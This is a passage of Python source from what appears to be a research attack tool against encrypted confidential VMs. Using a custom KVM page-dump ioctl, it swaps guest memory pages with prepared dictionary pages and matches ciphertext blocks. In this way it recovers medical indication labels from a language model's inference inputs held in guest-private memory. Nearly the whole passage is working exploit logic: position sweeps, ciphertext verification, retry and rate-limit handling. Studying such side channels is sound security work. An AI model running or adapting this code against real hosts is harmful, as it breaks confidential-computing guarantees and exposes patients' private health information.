        # an in-flight move may still land. Treat as unsound.
        return "abort"
    try:
        out = subprocess.run(["dmesg", "-k"], capture_output=True, text=True,
                             timeout=10).stdout
    except Exception as e:
        log_err(f"  [blind] could not read dmesg to classify failure: {e}")
        return "unknown"

    fresh, hi = [], _dmesg_seen_ts
    for line in out.splitlines():
        m = _RE_DMESG_TS.match(line)
        if not m:
            continue
        ts = float(m.group(1))
        hi = max(hi, ts)
        if ts > _dmesg_seen_ts:
            fresh.append(line)
    _dmesg_seen_ts = hi

    blob = "\n".join(fresh)
    for pat in _DMESG_ABORT:
        if pat in blob:
            log_err(f"  [blind] dmesg says UNSOUND ({pat!r}) — aborting")
            for ln in fresh[-6:]:
                log_err(f"  [blind]   {ln}")
            return "abort"
    if any(p in blob for p in _DMESG_SKIP_SAFE):
        return "skip_safe"
    if any(p in blob for p in _DMESG_RETRY):
        return "retry"
    return "unknown"


_SWAP_ROUNDTRIP_RETRIES = 2   # full re-swaps for a host-side (content-agnostic)
                              # failure; bounded so a wedged host cannot spin


def _swap_read_raw(swap_tool: str, dict_gpa: int,
                   ind_page_gpa: int) -> tuple[bytes | None, str]:
    """ONE --swap-back round-trip + ONE KVM_READ_PAGE_DUMP.

    Returns (raw, reason):
      (bytes, "ok")          success
      (None,  "skip_safe")   the page is provably NOT the target (the kernel
                             rejected it as not guest-private, and input_ids
                             always lives in guest-private memory), or it is
                             the dict page itself. Dropping it loses nothing.
      (None,  "unknown")     failed for a reason that says nothing about the
                             page's content, after exhausting retries. The
                             caller MUST NOT treat a sweep containing these as
                             a clean miss -- the skipped page could have been
                             the target.
    Raises SwapAbort when dmesg shows the guest/RMP was left unsound.

    Kernel semantics (is_swap_back=true): forward-swap so gfn1 holds gfn2's
    plaintext retweaked under gfn1's GPA, snapshot that into page_dump_buf,
    then swap back (guest RAM restored). KVM_READ_PAGE_DUMP returns that
    snapshot and CLEARS page_dump_valid — a second dump ioctl is always
    -EAGAIN, so recovering a lost dump needs a whole new round-trip.

    Callers pass dict_gpa as gfn1 (tweak target) and the page to sample as
    gfn2. Match: (dict_gpa from cache, ind_page).
    """
    if (dict_gpa & ~0xFFF) == (ind_page_gpa & ~0xFFF):
        log_err(f"  [blind] refuse self-swap gpa=0x{dict_gpa & ~0xFFF:x}")
        return None, "skip_safe"

    def _read_dump() -> bytes:
        kvm_fd = os.open("/dev/kvm", os.O_RDWR | os.O_CLOEXEC)
        try:
            buf = ctypes.create_string_buffer(_PAGE_SIZE)
            fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
            return bytes(buf)
        finally:
            os.close(kvm_fd)

    for attempt in range(_SWAP_ROUNDTRIP_RETRIES):
        r = subprocess.run(
            [swap_tool, f"0x{dict_gpa:x}", f"0x{ind_page_gpa:x}", "--swap-back"],
            capture_output=True)
        if r.returncode != 0:
            stderr = (r.stderr or b"").decode(errors="replace")
            kind = _classify_swap_failure(stderr)
            log_err(f"  [blind] swap failed dict_gpa=0x{dict_gpa:x} "
                    f"ind_page=0x{ind_page_gpa:x} (rc={r.returncode}, {kind})")
            if kind == "abort":
                raise SwapAbort(
                    f"unsound swap dict_gpa=0x{dict_gpa:x} "
                    f"ind_page=0x{ind_page_gpa:x}")
            if kind == "skip_safe":
                return None, "skip_safe"
            # "retry" and "unknown" are both content-agnostic: retry the whole
            # round-trip rather than skip, so the target page is never dropped
            # for a reason unrelated to what it holds.
            if attempt + 1 < _SWAP_ROUNDTRIP_RETRIES:
                time.sleep(_SWAP_PACE_SEC)
                continue
            return None, "unknown"

        try:
            return _read_dump(), "ok"
        except OSError as e:
            if e.errno == errno.EAGAIN:
                # page_dump_valid was false. The dump is consume-once, so the
                # only way back is another full round-trip, not another ioctl.
                log_err(f"  [blind] KVM_READ_PAGE_DUMP EAGAIN "
                        f"dict_gpa=0x{dict_gpa:x} — re-running the round-trip")
                if attempt + 1 < _SWAP_ROUNDTRIP_RETRIES:
                    time.sleep(_SWAP_PACE_SEC)
                    continue
            else:
                log_err(f"  [blind] KVM_READ_PAGE_DUMP failed "
                        f"dict_gpa=0x{dict_gpa:x} "
                        f"ind_page=0x{ind_page_gpa:x}: {e}")
            return None, "unknown"
    return None, "unknown"


def do_swap_read(swap_tool: str, dict_gpa: int, src_gpa: int, out_path: Path) -> None:
    run("swap_pages_tool (swap-back)",
        [swap_tool, f"0x{dict_gpa:x}", f"0x{src_gpa:x}", "--swap-back"])
    kvm_fd = os.open("/dev/kvm", os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(_PAGE_SIZE)
        fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
        raw = bytes(buf)
    finally:
        os.close(kvm_fd)
    out_path.write_text(_bytes_to_xp_dump(dict_gpa, raw) + "\n")
    log(f"  saved → {out_path.name}")


# ---------------------------------------------------------------------------
# Guest inference acquisition
# ---------------------------------------------------------------------------

def _parse_gpa_line(line: str, out: dict) -> None:
    m = re.search(r"input_ids base GPA:\s+0x([0-9a-f]+)", line, re.IGNORECASE)
    if m:
        out["base_gpa"] = int(m.group(1), 16)
    m = re.search(r"N_image_pad:\s+(\d+)", line)
    if m:
        out["N"] = int(m.group(1))
    m = re.search(r"N_indication_tokens:\s+(\d+)", line)
    if m:
        out["N_ind"] = int(m.group(1))
    m = re.search(r"tok_start:\s+(\d+)", line)
    if m:
        out["tok_start"] = int(m.group(1))
    m = re.search(r"HEADER_CONST_HINT:\s+(\d+)", line)
    if m:
        out["header_const"] = int(m.group(1))


def _have_exact_gpa(out: dict) -> bool:
    return ("base_gpa" in out and "N" in out
            and ("tok_start" in out or "header_const" in out))


def _pack_gpa_result(result: dict, base_only: bool) -> tuple:
    if base_only:
        log(f"  [host] base_gpa=0x{result['base_gpa']:x}")
        return result["base_gpa"], None, None, None, None
    N = result["N"]
    hc = result.get("header_const")
    ts = result.get("tok_start")
    if ts is None and hc is not None:
        ts = hc + N
    if hc is None and ts is not None:
        hc = ts - N
    n_ind = result.get("N_ind")
    log(f"  [host] base_gpa=0x{result['base_gpa']:x}  N={N}"
        f"  N_ind={n_ind}  tok_start={ts}  HEADER_CONST={hc}")
    return result["base_gpa"], N, n_ind, ts, hc


class GuestGpaSession:
    """One guest Python process; fresh input_ids allocation per acquire().

    Guest protocol (--stdin-loop): LOOP_READY → <index> → HOLDING → NEXT|QUIT.
    """

    def __init__(self,
                 script: str = GUEST_SCRIPT_DEFAULT,
                 cwd:    str = GUEST_CWD_DEFAULT,
                 python: str = GUEST_PYTHON_DEFAULT):
        self.script = script
        self.cwd = cwd
        self.python = python
        self.proc: subprocess.Popen | None = None
        self._q: queue.Queue = queue.Queue()
        self._holding = False

    def _cmd(self) -> str:
        nvidia_lib = (
            "$(ls -d /usr/local/lib/python3.10/dist-packages/nvidia/*/lib 2>/dev/null"
            " | tr '\\n' ':')"
        )
        return (f"source ~/miniconda3/etc/profile.d/conda.sh && conda activate vlm && "
                f"export LD_LIBRARY_PATH={nvidia_lib}$LD_LIBRARY_PATH && "
                f"cd {self.cwd} && sudo -E env LD_LIBRARY_PATH=\"$LD_LIBRARY_PATH\" "
                f"{self.python} -u {self.script} --gpa-only --calibrate --stdin-loop")

    def _alive(self) -> bool:
        return self.proc is not None and self.proc.poll() is None

    def start(self) -> bool:
        self.close()
        log("  [guest] starting persistent --stdin-loop process")
        self.proc = subprocess.Popen(
            SSH_BASE + [self._cmd()],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True, bufsize=1)
        self._q = queue.Queue()
        self._holding = False

        def _reader(stdout, q):
            try:
                for line in stdout:
                    print(f"  [guest] {line}", end="", flush=True)
                    if _log_fh:
                        _log_fh.write(f"  [guest] {line}")
                        _log_fh.flush()
                    q.put(line)
            finally:
                q.put(None)

        threading.Thread(target=_reader, args=(self.proc.stdout, self._q),
                         daemon=True).start()
        if not self._wait_marker("LOOP_READY", timeout=_GPA_TIMEOUT):
            log_err("  [guest] LOOP_READY not received")
            self.close()
            return False
        return True

    def _wait_marker(self, marker: str, timeout: float,
                     result: dict | None = None,
                     done=None) -> bool:
        deadline = time.time() + timeout
        while time.time() < deadline:
            if not self._alive() and self._q.empty():
                return False
            remaining = max(0.05, deadline - time.time())
            try:
                line = self._q.get(timeout=min(0.5, remaining))
            except queue.Empty:
                continue
            if line is None:
                return False
            if result is not None:
                _parse_gpa_line(line, result)
            if marker in line:
                if done is None or done(result or {}):
                    return True
            if done is not None and result is not None and done(result) and marker in line:
                return True
        return False

    def acquire(self, index: int, base_only: bool = False) -> tuple:
        """Allocate sample `index` in the guest process. Tensor stays alive until release()."""
        for attempt in range(3):
            if not self._alive():
                if not self.start():
                    log_err(f"[!] guest loop start failed ({attempt + 1}/3)")
                    time.sleep(5)
                    continue
            if self._holding:
                self.release()

            log(f"  [guest] loop index={index}")
            assert self.proc is not None and self.proc.stdin is not None
            try:
                self.proc.stdin.write(f"{index}\n")
                self.proc.stdin.flush()
            except Exception as e:
                log_err(f"  [guest] stdin write failed: {e}")
                self.close()
                continue

            result: dict = {}

            def _done(out: dict) -> bool:
                if base_only:
                    return "base_gpa" in out
                return _have_exact_gpa(out)

            ok = self._wait_marker("HOLDING", timeout=_GPA_TIMEOUT,
                                  result=result, done=_done)
            if ok and _done(result):
                self._holding = True
                return _pack_gpa_result(result, base_only)

            log_err(f"[!] GPA timeout/failed index={index} ({attempt + 1}/3)")
            # Never block on stderr.read() of a live process — it hangs forever
            # and only surfaces unrelated HF warnings.
            try:
                import select
                if self.proc and self.proc.stderr:
                    while True:
                        r, _, _ = select.select([self.proc.stderr], [], [], 0)
                        if not r:
                            break
                        chunk = self.proc.stderr.read(4096)
                        if not chunk:
                            break
                        if chunk.strip():
                            log_err(f"  [guest stderr] {chunk.strip()}")
            except Exception:
                pass
            self.close()
            if attempt < 2:
                time.sleep(5)
        return None, None, None, None, None

    def release(self) -> None:
        """Tell guest to drop the held input_ids (after host sweep/swap-back)."""
        if not self._alive() or not self._holding:
            self._holding = False
            return
        assert self.proc is not None and self.proc.stdin is not None
        try:
            self.proc.stdin.write("NEXT\n")
            self.proc.stdin.flush()
        except Exception:
            self._holding = False
            self.close()
            return
        self._wait_marker("RELEASED", timeout=60)
        self._holding = False
        # Let RMP settle before the guest mmaps the next input_ids (often the
        # same PFNs via the freelist under torch or the kernel).
        time.sleep(_RMP_SETTLE_SEC)

    def close(self) -> None:
        proc = self.proc
        self.proc = None
        was_holding = self._holding
        self._holding = False
        if proc is None:
            return
        try:
            if proc.poll() is None and proc.stdin:
                proc.stdin.write("QUIT\n")
                proc.stdin.flush()
        except Exception:
            pass
        try:
            proc.wait(timeout=10)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
            try:
                proc.wait(timeout=5)
            except Exception:
                pass
        if was_holding:
            time.sleep(_RMP_SETTLE_SEC)


def _acquire_gpa_raw(index: int,
                     script: str = GUEST_SCRIPT_DEFAULT,
                     cwd:    str = GUEST_CWD_DEFAULT,
                     python: str = GUEST_PYTHON_DEFAULT,
                     base_only: bool = False) -> tuple:
    """One-shot helper (starts a short-lived loop session for a single index)."""
    session = GuestGpaSession(script=script, cwd=cwd, python=python)
    try:
        result = session.acquire(index, base_only=base_only)
        return (*result, session)  # caller must session.close(); kept for compat
    except Exception:
        session.close()
        return None, None, None, None, None, None


# ---------------------------------------------------------------------------
# Blind sweep helpers
# ---------------------------------------------------------------------------

_HEX_LINE_CP = re.compile(r'[0-9a-f]{12,16}:\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)')


def _parse_cp_text(text: str) -> bytes | None:
    """Parse xp-format dump text → raw 4096 bytes, or None if short/malformed.

    Requires EXACTLY _PAGE_SIZE bytes — a truncated/malformed capture (e.g.
    a socket read that cut off mid-dump) must never silently compare as a
    shorter buffer; that previously could under-verify a match against only
    the FIRST few real lines while ignoring an incomplete tail.
    """
    chunks = []
    for line in text.splitlines():
        m = _HEX_LINE_CP.search(line)
        if m:
            chunks.append(struct.pack("<QQ", int(m.group(1), 16),
                                            int(m.group(2), 16)))
    data = b"".join(chunks)
    return data if len(data) == _PAGE_SIZE else None


def _parse_cp_file(path: Path) -> bytes | None:
    """Parse xp-format dump file → raw 4096 bytes."""
    try:
        return _parse_cp_text(path.read_text(errors="replace"))
    except Exception:
        return None


def _clean_aes_blocks_inline(token_offset: int, token_len: int) -> list[int]:
    end        = token_offset + token_len
    first_full = (token_offset + 15) & ~15
    return [b for b in range(first_full, end - 15, 16) if b + 16 <= 4096]


# Minimum clean AES blocks required to accept a MATCH.
# 4tok at offset%16==8 has exactly one clean 16B block — the build phases
# exist specifically to cover that residue, so requiring 2 would discard half
# of all 4tok landings as weak_blocks. Require >=1 (i.e. at least one full AES
# block inside the token span); 2tok at %16==8 still has 0 and stays rejected.
#
# NOT fixed in v4 (carried over from v3): a single 16B block cannot distinguish
# labels that share that exact block's bytes — e.g. "Shortness of breath mid"
# / "shortness of breath" share a middle "of breath" 2-token block, so both
# can verify at the same position and show up together as MULTI_MATCH.
MIN_CLEAN_AES_BLOCKS = 1


def _verify_raw_inline(raw: bytes, cp_data: bytes,
                       token_offset: int, token_len: int) -> bool:
    blocks = _clean_aes_blocks_inline(token_offset, token_len)
    if len(blocks) < MIN_CLEAN_AES_BLOCKS:
        return False
    return all(raw[blk:blk + 16] == cp_data[blk:blk + 16] for blk in blocks)


def _check_tok_is_image_pad(base_gpa: int, tok_start: int,
                             cache: dict, swap_tool: str) -> bool | None:
    """Single swap-back read; compare against image_pad×4 dict entry."""
    ind_gpa      = base_gpa + tok_start * 8
    token_offset = ind_gpa & 0xFFF
    ind_page_gpa = ind_gpa & ~0xFFF
    off_key      = hex(token_offset)
    entry        = cache.get(off_key, {}).get(str(_IPAD4_IDX))
    if entry is None:
        return None
    dict_gpa = int(entry["gpa"], 16)
    cp_path  = Path(entry["cp_file"])
    raw, _reason = _swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)
    if raw is None:
        return None
    cp_data = _parse_cp_file(cp_path)
    if cp_data is None:
        return None
    # raw == cp_data used to return None here as a "self-swap" guard. That
    # discarded the strongest possible positive: image_pad x4 is four copies of
    # the SAME token id, so its dict page is a period-8 constant pattern, and a
    # guest page sitting fully inside the padding run holds identical plaintext
    # -- hence identical ciphertext under gfn1's tweak. A full-page match is
    # exactly what a pure-padding page looks like, i.e. the thing this function
    # exists to find. Self-swap is already refused by the gfn1 == gfn2 check in
    # _swap_read_raw(), so no content-based guard is needed; _verify_raw_inline
    # returns True on a full-page match, which is the correct answer.
    return _verify_raw_inline(raw, cp_data, token_offset,
                              len(TOKEN_LABELS[_IPAD4_IDX][1]) * 8)


def _probe_ipad(base_gpa: int, pos: int, cache: dict, swap_tool: str) -> bool | None:
    """_check_tok_is_image_pad with one retry on an inconclusive (None)
    result, so a single transient swap/dump hiccup can't misdirect either
    search stage below."""
    r = _check_tok_is_image_pad(base_gpa, pos, cache, swap_tool)
    if r is None:
        r = _check_tok_is_image_pad(base_gpa, pos, cache, swap_tool)
    return r


def _find_pad_start(base_gpa: int, cache: dict, swap_tool: str) -> int | None:
    """Stage A: locate the token position where image_pad tokens actually
    begin for THIS sample.

    The old single-search design assumed padding starts at a fixed
    FIRST_PAD_POS=15 and searched for the LAST true position from there —
    but the true region is [real_start, real_end), and real_start clusters
    at 35-52 (empirically, never 15). Probing from 15 spends its opening
    moves in a dead False zone below real_start, which breaks binary
    search's required False-then-True-then-False monotonicity and can
    converge on garbage or nothing at all.

    Tries the known HEADER_CONST cluster first (frequency-sorted — the
    dominant case costs one swap), then a narrow scan of the empirically
    observed range, then a coarse full-range scan as a last resort for a
    genuinely unseen sample. Any True hit is walked backward to its exact
    left edge before being trusted as the start.
    """
    def confirmed_start(true_pos: int) -> int:
        while _probe_ipad(base_gpa, true_pos - 1, cache, swap_tool) is True:
            true_pos -= 1
        return true_pos

    for cand in KNOWN_HEADER_CONSTS:
        if _probe_ipad(base_gpa, cand, cache, swap_tool) is True:
            start = confirmed_start(cand)
            log(f"  [pad-start] known HEADER_CONST candidate hit ({cand}) → start={start}")
            return start

    log(f"  [pad-start] no known candidate — scanning "
        f"[{HEADER_CONST_MIN - 3}, {HEADER_CONST_MAX + 3}]")
    for pos in range(HEADER_CONST_MIN - 3, HEADER_CONST_MAX + 4):
        if _probe_ipad(base_gpa, pos, cache, swap_tool) is True:
            start = confirmed_start(pos)
            log(f"  [pad-start] found via narrow scan → start={start}")
            return start

    log_err("  [pad-start] unseen sample — coarse full-range scan "
            f"[{FIRST_PAD_POS}, {FIRST_PAD_POS + N_SWEEP_MAX}]")
    step = max(N_SWEEP_MIN, 20)
    pos = FIRST_PAD_POS
    while pos <= FIRST_PAD_POS + N_SWEEP_MAX:
        if _probe_ipad(base_gpa, pos, cache, swap_tool) is True:
            start = confirmed_start(pos)
            log(f"  [pad-start] found via full scan → start={start}")
            return start
        pos += step
    log_err("  [pad-start] not found anywhere in range")
    return None


def _find_pad_end(base_gpa: int, cache: dict, swap_tool: str, pad_start: int) -> int:
    """Stage B: binary search forward from a CONFIRMED-true pad_start for
    the last tok_start where image_pad×4 still matches. Unlike the old
    search, this one genuinely starts inside the True region, so standard
    binary search's True-then-False monotonicity actually holds. Bounded
    by the largest empirically observed N (+ margin) instead of a blind
    1200-wide sweep."""
    lo, hi    = pad_start, pad_start + max(KNOWN_N_VALUES) + 50
    last_true = pad_start
    n_checks  = 0
    while lo <= hi:
        mid    = (lo + hi) // 2
        result = _probe_ipad(base_gpa, mid, cache, swap_tool)
        n_checks += 1
        log(f"  [pad-end #{n_checks}] tok={mid}  result={result}")
        if result is True:
            last_true = mid
            lo = mid + 1
        else:
            hi = mid - 1
    log(f"  [pad-end] done ({n_checks} checks)  last_true={last_true}")
    return last_true


def _estimate_pad_bounds(base_gpa: int, cache: dict,
                         swap_tool: str) -> tuple[int | None, int | None]:
    """Two-stage replacement for the old single blind-search-for-N.

    Returns (pad_start, N_est), or (None, None) if pad_start can't be
    located at all (see _find_pad_start). N_est is snapped to the nearest
    empirically observed N_image_pad value when within N_VALUE_SNAP_TOL,
    correcting small boundary-detection noise from the swap-based probes.
    """
    pad_start = _find_pad_start(base_gpa, cache, swap_tool)
    if pad_start is None:
        return None, None
    last_true = _find_pad_end(base_gpa, cache, swap_tool, pad_start)
    n_raw   = last_true - pad_start + 4
    snapped = min(KNOWN_N_VALUES, key=lambda v: abs(v - n_raw))
    if abs(snapped - n_raw) <= N_VALUE_SNAP_TOL:
        if snapped != n_raw:
            log(f"  [pad-bounds] N_raw={n_raw} snapped to known value {snapped}")
        n_est = snapped
    else:
        n_est = n_raw
    log(f"  [pad-bounds] pad_start={pad_start}  N_est={n_est}")
    return pad_start, n_est


def sweep_blind(base_gpa: int, cache: dict, swap_tool: str,
                N: int | None = None, exact: bool = False,
                N_ind: int | None = None,
                tok_start_exact: int | None = None,
                header_const: int | None = None) -> tuple:
    """
    Find all verifying label hits inside the indication span.

    If exact=True, indication starts at tok_start_exact (preferred), else
    header_const + N, else HEADER_CONST + N. Scans the indication text
    (length N_ind if known exactly, else INDICATION_SCAN_MAX as a worst-case
    guess) so a label is found no matter where within the indication text it
    appears (not just when it's the first word(s)).
    If N is given but not exact, scan small window around N.
    Otherwise Phase 1: binary search on image_pad (~11 swaps).
    Phase 2: scan indication range (~42 steps).

    Filters:
      - label must fit entirely inside the indication token window

    _swap_cache keyed by (dict_gpa, ind_page_gpa) avoids re-swapping the same
    pair while scanning many labels/offsets on one indication page.

    Returns (matches, N_est) where matches is a list of
      {"tok_start", "ind_gpa", "token_idx", "n_blocks", "label"}
    sorted by (-dist_to_start, n_blocks, token_len). N_est is None if
    binary search was inconclusive.
    """
    _BSEARCH_MARGIN = 1
    N_est: int | None = None
    hc = header_const if header_const is not None else HEADER_CONST
    # True only for the fully-blind call (no guest N/N_ind/tok_start at all —
    # the only caller is host-only recovery, e.g. llm_e2e2.py). That path's
    # Phase-2 window is a worst-case guess (POST_SCAN_MIN..POST_SCAN_MAX =
    # 20..60 tokens past the estimated pad end), much wider than a real
    # indication (usually a handful of tokens). Scanning the full window
    # walks tens of tokens past the true indication end into whatever
    # follows it (template/pad/reused buffer content), where several labels'
    # single clean AES blocks (MIN_CLEAN_AES_BLOCKS=1) alias unrelated
    # ciphertext and MULTI_MATCH-bloat the result — confirmed live 2026-09-04
    # (index 2: clean hits at tok 448/452, then 5 repeating spurious labels
    # at tok 460..476). Exact-window callers (run_all, using guest-reported
    # N_ind) are unaffected — they already scan only the true indication span.
    fully_blind = N is None

    if N is not None and exact:
        if tok_start_exact is not None:
            start = tok_start_exact
        elif header_const is not None:
            start = header_const + N
        else:
            start = HEADER_CONST + N
        scan_len   = N_ind if N_ind is not None else INDICATION_SCAN_MAX
        tok_p2_min = start
        tok_p2_max = start + max(scan_len - 1, 0)
        N_est = N
        hc = (tok_start_exact - N) if tok_start_exact is not None else hc
        log(f"[blind] N={N} (live from guest)  indication starts at tok_start={start}"
            f"  HEADER_CONST={hc}"
            f"  scan_len={scan_len}{'(exact)' if N_ind is not None else '(guess)'}"
            f"  scanning [{tok_p2_min}, {tok_p2_max}] ({tok_p2_max - tok_p2_min + 1} steps)")
    elif N is not None:
        tok_p2_min = FIRST_PAD_POS + N + POST_SCAN_MIN - _BSEARCH_MARGIN
        tok_p2_max = FIRST_PAD_POS + N + POST_SCAN_MAX + _BSEARCH_MARGIN
        N_est = N
        log(f"[blind] N={N} (from metadata)  scanning [{tok_p2_min}, {tok_p2_max}]"
            f"  ({tok_p2_max - tok_p2_min + 1} steps)")
    else:
        log("[blind] Phase 1: estimating pad bounds via image_pad×4...")
        pad_start, N_est = _estimate_pad_bounds(base_gpa, cache, swap_tool)
        if pad_start is not None:
            tok_p2_min = pad_start + N_est + POST_SCAN_MIN - _BSEARCH_MARGIN
            tok_p2_max = pad_start + N_est + POST_SCAN_MAX + _BSEARCH_MARGIN
            log(f"[blind] pad_start={pad_start}  N≈{N_est}  Phase 2: [{tok_p2_min}, {tok_p2_max}]"
                f"  ({tok_p2_max - tok_p2_min + 1} steps)")
        else:
            log_err("[blind] pad-bounds estimation inconclusive")
            return [], None

    _swap_cache: dict[tuple[int, int], tuple[bytes | None, str]] = {}
    _cp_cache:   dict[str, bytes | None]             = {}
    _n_swap_fail = _n_fullpage = _n_no_blocks = _n_weak = _n_mismatch = 0
    _n_overflow = 0
    _n_swaps_this_sweep = 0
    # Pages dropped for a reason that does NOT prove they were not the target.
    # If this is non-zero and nothing matched, the sweep is INCONCLUSIVE, not a
    # clean miss: the skipped page could have held input_ids. Recording that as
    # NO_MATCH would mark the sample done and lose it permanently.
    _n_skip_unproven = 0
    _n_skip_safe = 0

    # Exclusive end of the indication token window — labels that stick past
    # this (e.g. 6tok into a 5tok indication) are rejected as overflow.
    ind_end = tok_p2_max + 1

    # Keep every confirmed hit. Ranking is for log order / primary fields only;
    # run_all records all matches.
    scored: list[tuple] = []  # (score, tok_start, ind_gpa, token_idx, raw, dict_gpa, n_blocks, label)

    # Fully-blind early stop: once we're past the first confirmed hit, give up
    # after BLIND_STOP_GAP consecutive tok_start values with no NEW hit. A
    # real indication is contiguous text — genuine label hits cluster right
    # after it starts; a gap that size is not "still inside the indication",
    # it's the guess-window's worst-case tail.
    # Calibrated live 2026-09-04 (index 2): true hits at tok=448 and tok=452
    # (gap=4, "Shortness OF BREATH and FEVER" — one unmatched word "and" in
    # between); the false-positive tail started at tok=460 (gap=8 from the
    # last true hit). GAP=6 stops at tok=459 — clears the true gap (4) with
    # margin, and breaks strictly before the tail is ever reached (8 > 6).
    # Before any hit, last_hit_tok is None and this never fires, so a late-
    # starting real indication is never cut off early — only the trailing
    # scan PAST a found indication is shortened.
    BLIND_STOP_GAP = 6
    last_hit_tok: int | None = None

    for tok_start in range(tok_p2_min, tok_p2_max + 1):
        if fully_blind and last_hit_tok is not None \
                and tok_start - last_hit_tok > BLIND_STOP_GAP:
            log(f"  [blind] early stop at tok={tok_start} "
                f"({BLIND_STOP_GAP} tok gap since last hit at {last_hit_tok})")
            break
        ind_gpa      = base_gpa + tok_start * 8
        token_offset = ind_gpa & 0xFFF
        ind_page_gpa = ind_gpa & ~0xFFF
        off_key      = hex(token_offset)
        if off_key not in cache:
            continue
        entries = cache[off_key]
        for token_idx in _LABEL_ORDER:
            entry = entries.get(str(token_idx))
            if entry is None:
                continue
            label, token_ids = TOKEN_LABELS[token_idx]
            n_tok = len(token_ids)
            if tok_start + n_tok > ind_end:
                _n_overflow += 1
                continue

            dict_gpa = int(entry["gpa"], 16)
            cp_path  = Path(entry["cp_file"])

            swap_key = (dict_gpa, ind_page_gpa)
            if swap_key not in _swap_cache:
                # Hard ceiling — independent of the caller's own pacing.
                # Reported host reboot (2026-09-04) traced to an UNBOUNDED
                # swap cascade in a caller (llm_batch_pilot.py) that chained
                # several full-block scans with no cap on total swaps for one
                # sweep_blind() call. Per-swap pacing alone was not a
                # sufficient safety net at that scale — this stops the
                # function itself from ever emitting more than
                # MAX_SWAPS_PER_SWEEP snp_guest_page_move rounds, regardless
                # of what any caller does.
                if _n_swaps_this_sweep >= MAX_SWAPS_PER_SWEEP:
                    log_err(f"  [!] sweep_blind: hit MAX_SWAPS_PER_SWEEP="
                            f"{MAX_SWAPS_PER_SWEEP} — aborting sweep early "
                            f"(tok_start={tok_start})")
                    LAST_SWEEP_STATS.update(
                        skip_safe=_n_skip_safe,
                        # hitting the cap leaves the rest of the block
                        # untested, which is exactly an unproven skip
                        skip_unproven=_n_skip_unproven + 1,
                        swaps=_n_swaps_this_sweep)
                    return ([{
                        "tok_start": m[1], "ind_gpa": m[2], "token_idx": m[3],
                        "n_blocks": m[6], "label": m[7],
                    } for m in sorted(scored, key=lambda c: c[0], reverse=True)]
                            if scored else []), N_est
                _n_swaps_this_sweep += 1
                if _SWAP_BURST_COOLDOWN > 0 and _n_swaps_this_sweep % _SWAP_BURST_COOLDOWN == 0:
                    log(f"  [pace] burst cooldown after {_n_swaps_this_sweep} swaps "
                        f"({_SWAP_BURST_SLEEP:.1f}s)")
                    time.sleep(_SWAP_BURST_SLEEP)
                elif _SWAP_PACE_SEC > 0:
                    time.sleep(_SWAP_PACE_SEC)
                # SwapAbort propagates out of sweep_blind and out of run_all:
                # after an unsound swap the guest is half-modified and every
                # further swap compounds the RMP leak.
                _swap_cache[swap_key] = _swap_read_raw(
                    swap_tool, dict_gpa, ind_page_gpa)
            raw, reason = _swap_cache[swap_key]
            if raw is None:
                _n_swap_fail += 1
                if reason == "skip_safe":
                    _n_skip_safe += 1
                else:
                    _n_skip_unproven += 1
                continue

            cp_key = str(cp_path)
            if cp_key not in _cp_cache:
                _cp_cache[cp_key] = _parse_cp_file(cp_path)
            cp_data = _cp_cache[cp_key]
            if cp_data is None:
                continue

            # A full-page match is NOT a self-swap and must not be discarded:
            # _swap_read_raw() already refuses gfn1 == gfn2, and for the
            # image_pad x4 entry (all four tokens are the same id, so the dict
            # page is a period-8 constant pattern) a guest page lying entirely
            # inside the padding run legitimately produces byte-identical
            # ciphertext. Dropping it here threw away the clearest hit. Count
            # it for visibility and fall through to the normal verification.
            if raw == cp_data:
                _n_fullpage += 1

            token_len = n_tok * 8
            blocks = _clean_aes_blocks_inline(token_offset, token_len)
            if not blocks:
                _n_no_blocks += 1
                continue
            if len(blocks) < MIN_CLEAN_AES_BLOCKS:
                _n_weak += 1
                continue

            if not _verify_raw_inline(raw, cp_data, token_offset, token_len):
                _n_mismatch += 1
                continue

            # Stability: _swap_read_raw is one round-trip + one dump (dump
            # buffer is consume-once). Do not call it again for the same hit.

            dist = abs(tok_start - tok_p2_min)
            # Closer to indication start first; then more blocks; then longer.
            score = (-dist, len(blocks), token_len)
            scored.append((score, tok_start, ind_gpa, token_idx, raw, dict_gpa,
                           len(blocks), label))
            if fully_blind:
                last_hit_tok = tok_start if last_hit_tok is None else max(last_hit_tok, tok_start)

    if scored:
        scored.sort(key=lambda c: c[0], reverse=True)
        matches = []
        for score, tok_start, ind_gpa, token_idx, raw, dict_gpa, n_blocks, label in scored:
            matches.append({
                "tok_start": tok_start,
                "ind_gpa":   ind_gpa,
                "token_idx": token_idx,
                "n_blocks":  n_blocks,
                "label":     label,
            })
            out_path = HERE / f"blind_ts{tok_start}_t{token_idx}.out"
            out_path.write_text(_bytes_to_xp_dump(dict_gpa, raw) + "\n")

        n = len(matches)
        kind = "MULTI_MATCH" if n > 1 else "MATCH"
        log(f"[blind] {kind} ({n}): "
            + " | ".join(
                f"tok={m['tok_start']} idx={m['token_idx']} '{m['label']}' "
                f"off=0x{m['ind_gpa'] & 0xFFF:x} blocks={m['n_blocks']}"
                for m in matches))
        LAST_SWEEP_STATS.update(skip_safe=_n_skip_safe,
                                skip_unproven=_n_skip_unproven,
                                swaps=_n_swaps_this_sweep)
        return matches, N_est

    log_err(f"[blind] No match: swap_fail={_n_swap_fail}"
            f" skip_safe={_n_skip_safe} skip_unproven={_n_skip_unproven}"
            f" fullpage_match={_n_fullpage}"
            f" no_blocks={_n_no_blocks} weak_blocks={_n_weak} mismatch={_n_mismatch}"
            f" overflow={_n_overflow}")
    LAST_SWEEP_STATS.update(skip_safe=_n_skip_safe,
                            skip_unproven=_n_skip_unproven,
                            swaps=_n_swaps_this_sweep)
    return [], N_est


# ---------------------------------------------------------------------------
# run_all
# ---------------------------------------------------------------------------

def _skipcols(stats: dict) -> dict:
    return {"skip_safe": stats.get("skip_safe", 0),
            "skip_unproven": stats.get("skip_unproven", 0),
            "swaps": stats.get("swaps", 0)}


def run_all(swap_tool: str, blind: bool = False) -> None:
    """Load filtered_samples.json and run blind sweep for each sample."""
    if not DICT_CACHE.exists():
        log_err("[run-all] dict_cache.json not found — run --build first")
